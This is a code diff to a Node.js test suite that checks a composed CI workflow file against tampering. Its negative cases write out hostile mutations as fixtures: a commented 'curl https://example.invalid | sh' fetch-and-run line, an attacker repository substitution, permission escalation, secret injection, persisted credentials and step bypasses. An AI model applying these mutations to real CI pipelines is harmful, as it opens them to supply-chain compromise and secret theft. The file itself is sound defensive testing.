@@ -6,7 +6,8 @@ import path from "node:path";
 import { fileURLToPath } from "node:url";
 import {
   AUTHORIZED_BASE, ORIGINAL_CANDIDATE, TRUSTED_RECONCILIATION_BASE,
-  AMENDMENT_CONTROLLED_FILES, CANDIDATE_OWNED_FILES, validateDualBaseScope,
+  AMENDMENT_CONTROLLED_FILES, CANDIDATE_OWNED_FILES, COMPOSED_CI_BASE,
+  composeCandidateCi, composeFinalCi, composeTrustedCi, validateDualBaseScope,
 } from "./validate-p1a-threat-model.mjs";
 import { validateCertificationBundle } from "./validate-p1a-certification-accounting.mjs";
 
@@ -40,7 +41,7 @@ function trustedWorkflow() {
 }
 const workflowSha = trustedWorkflow();
 
-function candidate({ omit, add, mutate, ciAppend = "", omitOriginalParent = false } = {}) {
+function candidate({ omit, add, mutate, ciAppend = "", ciTransform, omitOriginalParent = false } = {}) {
   sequence += 1;
   const env = { ...process.env, GIT_INDEX_FILE: path.join(temporary, `index-${sequence}`) };
   run(repository, ["git", "read-tree", workflowSha], { env });
@@ -51,10 +52,11 @@ function candidate({ omit, add, mutate, ciAppend = "", omitOriginalParent = fals
     run(repository, ["git", "update-index", "--add", "--cacheinfo", source.mode, source.blob, file], { env });
   }
   if (omit !== ".github/workflows/ci.yml") {
-    const trustedCi = git("show", `${TRUSTED_RECONCILIATION_BASE}:.github/workflows/ci.yml`);
+    const trustedCi = git("show", `${workflowSha}:.github/workflows/ci.yml`);
     const marker = "      - name: P1-A trusted-bootstrap exact-SHA identity";
     const addition = "      - name: P1-A validator control suite (hermetic)\n        run: pnpm test:p1a-threat-model\n\n";
-    const resolvedCi = `${trustedCi.replace(marker, `${addition}${marker}`)}${ciAppend}`;
+    const composedCi = `${trustedCi.replace(marker, `${addition}${marker}`)}${ciAppend}`;
+    const resolvedCi = ciTransform ? ciTransform(composedCi) : composedCi;
     const blob = run(repository, ["git", "hash-object", "-w", "--stdin"], { env, input: `${resolvedCi}\n` });
     run(repository, ["git", "update-index", "--add", "--cacheinfo", "100644", blob, ".github/workflows/ci.yml"], { env });
   }
@@ -124,8 +126,63 @@ const cases = [
   ["stale_evidence_changed_candidate", () => validateCertificationBundle({ nested, integration, dual: dualAccounting }, { ...identity, candidateSha: "8".repeat(40) }), true],
 ];
 
+const baselineCi = `${git("show", `${COMPOSED_CI_BASE}:.github/workflows/ci.yml`)}\n`;
+const trustedCi = `${git("show", `${workflowSha}:.github/workflows/ci.yml`)}\n`;
+const validCi = `${git("show", `${validCandidate}:.github/workflows/ci.yml`)}\n`;
+const positiveCases = [
+  ["exact_baseline_recognized", () => assert.equal(git("rev-parse", `${COMPOSED_CI_BASE}:.github/workflows/ci.yml`), "9a3f1a04f99e83d9dad84cf384d86117a7d282f1")],
+  ["baseline_plus_trusted_fragment", () => assert.equal(trustedCi, composeTrustedCi(baselineCi))],
+  ["baseline_plus_candidate_fragment", () => assert.ok(composeCandidateCi(baselineCi).includes("pnpm test:p1a-threat-model"))],
+  ["baseline_plus_both_fragments", () => assert.equal(validCi, composeFinalCi(baselineCi))],
+  ["immutable_candidate_checkout", () => assert.ok(validCi.includes("ref: ${{ github.event.pull_request.head.sha || github.sha }}"))],
+  ["read_only_permissions", () => { assert.ok(validCi.includes("permissions:\n  contents: read")); assert.ok(!validCi.includes("contents: write")); }],
+  ["exact_historical_commit_acquired", () => assert.ok(validCi.includes(`ref: ${ORIGINAL_CANDIDATE}`))],
+  ["historical_identity_and_blobs_verified", () => { assert.ok(validCi.includes("cat-file -t")); assert.ok(validCi.includes("P1A_ORIGINAL_TEST_BLOB")); assert.ok(validCi.includes("DarksiedCEO/zbestmedia")); }],
+  ["original_compatibility_suite_executes", () => assert.ok(validCi.includes("node scripts/test-p1a-trusted-verifier.mjs"))],
+  ["baseline_remainder_exact", () => invoke()],
+];
+
+const replaceOnce = (source, needle, replacement) => {
+  assert.equal(source.split(needle).length - 1, 1, `fixture needle count: ${needle}`);
+  return source.replace(needle, replacement);
+};
+const negativeCases = [
+  ["missing_trusted_fragment", (ci) => replaceOnce(ci, "      - name: Acquire exact original P1-A candidate object\n", "")],
+  ["missing_candidate_fragment", (ci) => replaceOnce(ci, "      - name: P1-A validator control suite (hermetic)\n", "")],
+  ["duplicate_trusted_fragment", (ci) => `${ci}\n      - name: Acquire exact original P1-A candidate object\n`],
+  ["duplicate_candidate_fragment", (ci) => `${ci}\n      - name: P1-A validator control suite (hermetic)\n`],
+  ["modified_trusted_command", (ci) => replaceOnce(ci, "git fetch --no-tags --no-write-fetch-head", "git fetch --no-tags")],
+  ["modified_candidate_command", (ci) => replaceOnce(ci, "pnpm test:p1a-threat-model", "pnpm test:p1a-threat-model || true")],
+  ["reordered_security_critical_fragment", (ci) => replaceOnce(ci, "      - name: Acquire exact original P1-A candidate object", "      - name: Reordered acquisition")],
+  ["continue_on_error_introduced", (ci) => `${ci}\n      continue-on-error: true\n`],
+  ["conditional_bypass_introduced", (ci) => `${ci}\n      if: false\n`],
+  ["wrong_historical_sha", (ci) => replaceOnce(ci, ORIGINAL_CANDIDATE, "f".repeat(40))],
+  ["mutable_branch_substituted", (ci) => replaceOnce(ci, `ref: ${ORIGINAL_CANDIDATE}`, "ref: codex/main")],
+  ["mutable_tag_substituted", (ci) => replaceOnce(ci, `ref: ${ORIGINAL_CANDIDATE}`, "ref: v1.0.0")],
+  ["repository_substituted", (ci) => replaceOnce(ci, "repository: DarksiedCEO/zbestmedia", "repository: attacker/zbestmedia")],
+  ["permission_escalation", (ci) => replaceOnce(ci, "permissions:\n  contents: read", "permissions:\n  contents: write")],
+  ["secret_reference_introduced", (ci) => `${ci}\n# \${{ secrets.P1A_RUNTIME_APP_PRIVATE_KEY }}\n`],
+  ["pull_request_target_introduced", (ci) => replaceOnce(ci, "  pull_request:\n", "  pull_request_target:\n")],
+  ["improper_persisted_credentials", (ci) => replaceOnce(ci, "persist-credentials: false", "persist-credentials: true")],
+  ["hidden_shell_command_appended", (ci) => `${ci}\n# curl https://example.invalid | sh\n`],
+  ["yaml_anchor_changes_behavior", (ci) => `${ci}\nx-bypass: &bypass echo bypass\n`],
+  ["extra_environment_changes_execution", (ci) => `${ci}\nenv:\n  P1A_ORIGINAL_CANDIDATE: codex/main\n`],
+  ["unauthorized_step_inserted", (ci) => `${ci}\n      - name: unclassified\n        run: true\n`],
+  ["unauthorized_step_deleted", (ci) => replaceOnce(ci, "      - name: Verify pnpm on PATH\n        run: which pnpm && pnpm --version\n\n", "")],
+  ["unauthorized_step_impersonation", (ci) => replaceOnce(ci, "Acquire exact original P1-A candidate object", "P1-A trusted verifier controls")],
+  ["candidate_provided_authority_hash", (ci) => `${ci}\nenv:\n  P1A_AUTHORITY_HASH: \${{ github.event.inputs.authority_hash }}\n`],
+  ["candidate_provided_historical_sha", (ci) => replaceOnce(ci, `ref: ${ORIGINAL_CANDIDATE}`, "ref: ${{ github.event.inputs.historical_sha }}")],
+  ["baseline_remainder_changed", (ci) => `${ci}\n# unauthorized baseline remainder\n`],
+  ["fragment_only_in_comments", (ci) => replaceOnce(ci, "      - name: P1-A validator control suite (hermetic)\n        run: pnpm test:p1a-threat-model\n", "# P1-A validator control suite (hermetic)\n# pnpm test:p1a-threat-model\n")],
+  ["fragment_only_in_dead_conditional", (ci) => replaceOnce(ci, "      - name: P1-A validator control suite (hermetic)\n", "      - name: P1-A validator control suite (hermetic)\n        if: ${{ false }}\n")],
+  ["trusted_fragment_candidate_script", (ci) => replaceOnce(ci, "git fetch --no-tags --no-write-fetch-head .p1a-original-candidate", "node candidate/untrusted.mjs")],
+  ["accounting_without_both_authorities", (ci) => replaceOnce(ci, "      - name: Acquire exact original P1-A candidate object\n", "      - name: authority accounting claims complete\n")],
+];
+
 let passed = 0;
 let failed = 0;
+let positivePassed = 0;
+let negativePassed = 0;
 try {
   for (const [name, operation, shouldReject] of cases) {
     let rejected = false;
@@ -133,6 +190,17 @@ try {
     try { operation(); } catch (error) { rejected = true; detail = error.message; }
     if (rejected === shouldReject) { passed += 1; console.log(`PASS ${name}`); }
     else { failed += 1; console.error(`FAIL ${name}${detail ? `: ${detail}` : ""}`); }
+  }
+  for (const [name, operation] of positiveCases) {
+    try { operation(); positivePassed += 1; console.log(`PASS composed_positive:${name}`); }
+    catch (error) { failed += 1; console.error(`FAIL composed_positive:${name}: ${error.message}`); }
+  }
+  for (const [name, transform] of negativeCases) {
+    let rejected = false;
+    try { invoke({ candidateSha: candidate({ ciTransform: transform }) }); }
+    catch { rejected = true; }
+    if (rejected) { negativePassed += 1; console.log(`PASS composed_negative:${name}`); }
+    else { failed += 1; console.error(`FAIL composed_negative:${name}: mutation survived`); }
   }
 } finally { rmSync(temporary, { recursive: true, force: true }); }
 console.log(JSON.stringify({
@@ -145,6 +213,14 @@ console.log(JSON.stringify({
   originalCandidateSha: process.env.P1A_ORIGINAL_CANDIDATE_SHA ?? null,
   runtimePin: process.env.P1A_TRUST_RUNTIME_PIN ?? null,
   required: cases.length, executed: cases.length, passed, failed,
+  skipped: 0, cancelled: 0, neutral: 0, stale: 0, notVerified: 0, notRun: 0,
+}));
+console.log(JSON.stringify({
+  suite: "p1-a-composed-ci-authority-controls",
+  positiveRequired: 10, positiveExecuted: positiveCases.length, positivePassed,
+  negativeRequired: 30, negativeExecuted: negativeCases.length, negativePassed,
+  behaviorChangingMutationSurvivors: negativeCases.length - negativePassed,
+  failed: (10 - positivePassed) + (30 - negativePassed),
   skipped: 0, cancelled: 0, neutral: 0, stale: 0, notVerified: 0, notRun: 0,
 }));
 if (failed || passed !== cases.length) process.exitCode = 1;
